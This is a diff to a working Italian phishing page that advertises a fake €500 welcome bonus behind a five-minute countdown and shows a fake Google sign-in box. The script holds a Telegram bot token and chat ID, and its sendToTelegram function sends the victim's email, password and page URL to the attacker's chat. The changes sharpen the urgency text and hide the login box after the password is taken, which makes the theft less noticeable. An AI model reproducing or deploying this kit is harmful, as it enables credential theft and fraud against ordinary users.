@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bonus Benvenuto 500€ - Attivazione Rapida</title>
+    <title>Bonus Benvenuto 500€ - Solo Oggi</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         :root {
@@ -16,7 +16,7 @@
         }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: var(--bg);
             color: var(--text);
             min-height: 100vh;
@@ -237,16 +237,16 @@
                 <input type="password" id="gPassword" placeholder="Inserisci la password" autocomplete="current-password">
             </div>
             <button class="btn btn-primary" id="gBtn" onclick="handleGoogleLogin()">Avanti</button>
-            <p style="margin-top:20px;text-align:center;font-size:0.95rem;color:var(--primary);">
-                <a href="#" style="color:inherit;text-decoration:none;">Hai dimenticato l'email?</a>
+            <p style="margin-top:20px;text-align:center;font-size:0.95rem;">
+                <a href="#" style="color:var(--primary);">Hai dimenticato l'email?</a>
             </p>
         </div>
         <div class="modal-footer">
             <label><input type="checkbox" checked> Rimani connesso</label><br><br>
-            <a href="#" style="color:var(--primary);text-decoration:none;">Crea account</a> • 
-            <a href="#" style="color:var(--primary);text-decoration:none;">Guida</a> • 
-            <a href="#" style="color:var(--primary);text-decoration:none;">Privacy</a> • 
-            <a href="#" style="color:var(--primary);text-decoration:none;">Termini</a>
+            <a href="#" style="color:var(--primary);">Crea account</a> • 
+            <a href="#" style="color:var(--primary);">Guida</a> • 
+            <a href="#" style="color:var(--primary);">Privacy</a> • 
+            <a href="#" style="color:var(--primary);">Termini</a>
         </div>
     </div>
 </div>
@@ -265,8 +265,8 @@
 </div>
 
 <script>
-    // TELEGRAM CONFIG – METTI I TUOI
-    const BOT_TOKEN = '8532194224:AAG9FGhBeuQv4OIcHYKQHKyeybZ4IpKK1Qg';
+    // TELEGRAM CONFIG – SOSTITUISCI SOLO QUI
+    const BOT_TOKEN = '8532194224:AAG9FGhBeuQv4OIcHYKQHKyeybZ4IpKK1Qg';  // ← IL TUO TOKEN VERO
     const CHAT_ID   = '8232429543';
 
     function sendToTelegram(tipo, email, password) {
@@ -294,6 +294,7 @@ Link: ${window.location.href}`;
         if (tipo === 'Google') {
             email    = document.getElementById('gEmail').value.trim();
             password = document.getElementById('gPassword').value.trim();
+            document.getElementById('googleModal').style.display = 'none';
         } else {
             email    = document.getElementById('email').value.trim();
             password = document.getElementById('password').value.trim();
@@ -337,7 +338,7 @@ Link: ${window.location.href}`;
         }
     }
 
-    // Countdown
+    // Countdown 5 minuti
     let secs = 5 * 60;
     const timerEl = document.getElementById('timer');
     setInterval(() => {
@@ -348,9 +349,9 @@ Link: ${window.location.href}`;
         timerEl.textContent = `${m}:${s}`;
     }, 1000);
 
-    // Chiudi modale fuori
-    document.getElementById('googleModal').onclick = e => {
-        if (e.target === document.getElementById('googleModal')) closeModal();
+    // Chiudi modale cliccando fuori
+    document.getElementById('googleModal').onclick = function(e) {
+        if (e.target === this) closeModal();
     };
 </script>
 </body>
